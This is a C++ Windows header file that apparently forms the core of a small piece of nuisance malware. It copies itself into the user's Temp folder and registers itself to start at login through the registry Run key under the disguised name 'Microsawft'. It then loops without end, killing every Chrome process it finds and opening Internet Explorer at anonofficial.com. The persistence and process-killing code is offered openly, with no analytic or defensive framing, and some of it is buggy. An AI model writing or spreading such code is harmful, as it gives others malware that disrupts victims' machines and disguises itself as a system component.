#pragma once
#include <Windows.h>
#include <wchar.h>
#include <string>
#include <TlHelp32.h>
#include <fstream>
#include <experimental/filesystem> 
#include <filesystem>
using namespace std;
namespace fs = std::filesystem;
string getProgramName(string);
void makeStartWithWindows(string);
void findAndKillChrome();
void findRunningProcess(string);
void killChrome(DWORD, UINT);
void copyFileToTemp(string, string);

string getProgramName(string filename) {
	const size_t last_slash_idx = filename.find_last_of("\\/");
	if (string::npos != last_slash_idx)
	{
		filename.erase(0, last_slash_idx + 1);
	}
	return filename;
}
void makeStartWithWindows(string exeName)
{
	string pathAndEXE = " C:\\Users\\%username%\\AppData\\Local\\Temp\\";
	pathAndEXE += exeName;

	string progPath = pathAndEXE;
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG status = RegSetValueEx(hkey, "Microsawft", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}

void findAndKillChrome()
{
	while (true)
	{
		findRunningProcess("chrome.exe");
		Sleep(500);
	}
}

void findRunningProcess(string process)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		if (pe32.szExeFile == process)
		{
			TerminateProcess(hProcessSnap, 1);
		}
		else
		{
			while (Process32Next(hProcessSnap, &pe32))
			{
				if (pe32.szExeFile == process)
				{
					killChrome(pe32.th32ProcessID, 1);
					ShellExecute(0, "open",
						"C:\\progra~1\\intern~1\\iexplore.exe",
						"https://anonofficial.com/",
						"",
						SW_MAXIMIZE);
					break;
				}
			}
		}
		CloseHandle(hProcessSnap);
	}
}
void killChrome(DWORD dwProcessId, UINT uExitCode)
{
	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL bInheritHandle = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
}

void copyFileToTemp(string file, string filename) {
	char username[128];
	DWORD username_len = 128;
	GetUserName(username, &username_len);
	fs::path sourceFile = file;
	fs::path targetParent = "C:\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\";
	fs::path target = targetParent / sourceFile.filename();

	fs::create_directories(targetParent);
	fs::copy_file(sourceFile, target, fs::copy_options::overwrite_existing);
}
